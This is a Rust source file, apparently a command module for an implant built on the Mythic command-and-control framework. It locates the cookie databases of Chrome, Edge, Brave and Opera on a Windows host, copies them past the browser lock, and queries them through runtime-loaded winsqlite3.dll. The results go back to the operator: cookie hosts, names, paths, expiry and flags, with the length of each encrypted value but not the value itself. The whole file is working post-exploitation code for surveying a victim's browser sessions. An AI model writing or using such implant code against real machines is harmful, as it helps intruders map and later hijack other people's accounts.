use crate::{AgentTask, mythic_error, mythic_success};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct BrowserCookiesArgs {
    browser: String,
    domain_filter: String,
}

pub fn browser_cookies(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_error!(task.id, "browser_cookies is only supported on Windows"));
    }

    #[cfg(target_os = "windows")]
    {
        let args: BrowserCookiesArgs = serde_json::from_str(&task.parameters)?;
        let browser = args.browser.as_str();
        let domain_filter = args.domain_filter.as_str();

        let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let appdata = std::env::var("APPDATA").unwrap_or_default();

        let mut browsers: Vec<(&str, String)> = Vec::new();
        if browser == "all" || browser == "chrome" {
            browsers.push(("chrome", format!("{}\\Google\\Chrome\\User Data", local_appdata)));
        }
        if browser == "all" || browser == "edge" {
            browsers.push(("edge", format!("{}\\Microsoft\\Edge\\User Data", local_appdata)));
        }
        if browser == "all" || browser == "brave" {
            browsers.push(("brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data", local_appdata)));
        }
        if browser == "all" || browser == "opera" {
            browsers.push(("opera", format!("{}\\Opera Software\\Opera Stable", appdata)));
        }

        let mut all_results: Vec<serde_json::Value> = Vec::new();

        for (bname, base_path) in &browsers {
            let cookie_db = {
                let network_path = format!("{}\\Default\\Network\\Cookies", base_path);
                let legacy_path = format!("{}\\Default\\Cookies", base_path);
                if std::path::Path::new(&network_path).exists() {
                    network_path
                } else if std::path::Path::new(&legacy_path).exists() {
                    legacy_path
                } else {
                    continue;
                }
            };

            // Copy to temp (browser locks the DB)
            let temp_dir = std::env::temp_dir();
            let rand_suffix: u32 = rand::random();
            let tmp_path = temp_dir.join(format!("{}{}.tmp", bname, rand_suffix));
            if std::fs::copy(&cookie_db, &tmp_path).is_err() {
                continue;
            }

            // Query using winsqlite3.dll via raw FFI (ships with Windows 10+)
            let results = unsafe { query_cookies_native(&tmp_path, domain_filter) };
            let _ = std::fs::remove_file(&tmp_path);

            for row in results {
                let mut entry = row;
                entry["browser"] = serde_json::Value::String(bname.to_string());
                all_results.push(entry);
            }
        }

        if all_results.is_empty() {
            Ok(mythic_success!(task.id, "No cookies found"))
        } else {
            let output = serde_json::to_string_pretty(&all_results)?;
            Ok(mythic_success!(task.id, format!("Found {} cookies\n\n{}", all_results.len(), output)))
        }
    }
}

#[cfg(target_os = "windows")]
unsafe fn query_cookies_native(
    db_path: &std::path::Path,
    domain_filter: &str,
) -> Vec<serde_json::Value> {
    use std::ffi::CString;
    use std::os::windows::ffi::OsStrExt;

    type Sqlite3Open = unsafe extern "C" fn(*const u8, *mut *mut std::ffi::c_void) -> i32;
    type Sqlite3PrepareV2 = unsafe extern "C" fn(*mut std::ffi::c_void, *const u8, i32, *mut *mut std::ffi::c_void, *mut *const u8) -> i32;
    type Sqlite3Step = unsafe extern "C" fn(*mut std::ffi::c_void) -> i32;
    type Sqlite3ColumnText = unsafe extern "C" fn(*mut std::ffi::c_void, i32) -> *const u8;
    type Sqlite3ColumnInt = unsafe extern "C" fn(*mut std::ffi::c_void, i32) -> i32;
    type Sqlite3ColumnInt64 = unsafe extern "C" fn(*mut std::ffi::c_void, i32) -> i64;
    type Sqlite3Finalize = unsafe extern "C" fn(*mut std::ffi::c_void) -> i32;
    type Sqlite3Close = unsafe extern "C" fn(*mut std::ffi::c_void) -> i32;

    let mut results = Vec::new();

    // Load winsqlite3.dll
    let lib_name: Vec<u16> = std::ffi::OsStr::new("winsqlite3.dll").encode_wide().chain(std::iter::once(0)).collect();
    let lib = winapi::um::libloaderapi::LoadLibraryW(lib_name.as_ptr());
    if lib.is_null() {
        return results;
    }

    macro_rules! get_fn {
        ($name:expr, $ty:ty) => {{
            let cname = CString::new($name).unwrap();
            let ptr = winapi::um::libloaderapi::GetProcAddress(lib, cname.as_ptr());
            if ptr.is_null() { return results; }
            std::mem::transmute::<_, $ty>(ptr)
        }};
    }

    let sqlite3_open: Sqlite3Open = get_fn!("sqlite3_open", Sqlite3Open);
    let sqlite3_prepare_v2: Sqlite3PrepareV2 = get_fn!("sqlite3_prepare_v2", Sqlite3PrepareV2);
    let sqlite3_step: Sqlite3Step = get_fn!("sqlite3_step", Sqlite3Step);
    let sqlite3_column_text: Sqlite3ColumnText = get_fn!("sqlite3_column_text", Sqlite3ColumnText);
    let sqlite3_column_int: Sqlite3ColumnInt = get_fn!("sqlite3_column_int", Sqlite3ColumnInt);
    let sqlite3_column_int64: Sqlite3ColumnInt64 = get_fn!("sqlite3_column_int64", Sqlite3ColumnInt64);
    let sqlite3_finalize: Sqlite3Finalize = get_fn!("sqlite3_finalize", Sqlite3Finalize);
    let sqlite3_close: Sqlite3Close = get_fn!("sqlite3_close", Sqlite3Close);

    let db_path_c = CString::new(db_path.to_string_lossy().as_bytes()).unwrap();
    let mut db: *mut std::ffi::c_void = std::ptr::null_mut();

    if sqlite3_open(db_path_c.as_ptr() as *const u8, &mut db) != 0 {
        return results;
    }

    let query = if domain_filter.is_empty() {
        CString::new("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, length(encrypted_value) FROM cookies LIMIT 200").unwrap()
    } else {
        CString::new(format!(
            "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, length(encrypted_value) FROM cookies WHERE host_key LIKE '%{}%' LIMIT 200",
            domain_filter.replace('\'', "''")
        )).unwrap()
    };

    let mut stmt: *mut std::ffi::c_void = std::ptr::null_mut();
    if sqlite3_prepare_v2(db, query.as_ptr() as *const u8, -1, &mut stmt, std::ptr::null_mut()) != 0 {
        sqlite3_close(db);
        return results;
    }

    const SQLITE_ROW: i32 = 100;

    while sqlite3_step(stmt) == SQLITE_ROW {
        let host_key = read_sqlite_text(sqlite3_column_text(stmt, 0));
        let name = read_sqlite_text(sqlite3_column_text(stmt, 1));
        let path = read_sqlite_text(sqlite3_column_text(stmt, 2));
        let expires = sqlite3_column_int64(stmt, 3);
        let secure = sqlite3_column_int(stmt, 4);
        let httponly = sqlite3_column_int(stmt, 5);
        let enc_len = sqlite3_column_int(stmt, 6);

        results.push(serde_json::json!({
            "host_key": host_key,
            "name": name,
            "path": path,
            "expires_utc": expires,
            "secure": secure,
            "httponly": httponly,
            "encrypted_value_length": enc_len,
        }));
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    results
}

#[cfg(target_os = "windows")]
unsafe fn read_sqlite_text(ptr: *const u8) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let cstr = std::ffi::CStr::from_ptr(ptr as *const i8);
    cstr.to_string_lossy().into_owned()
}
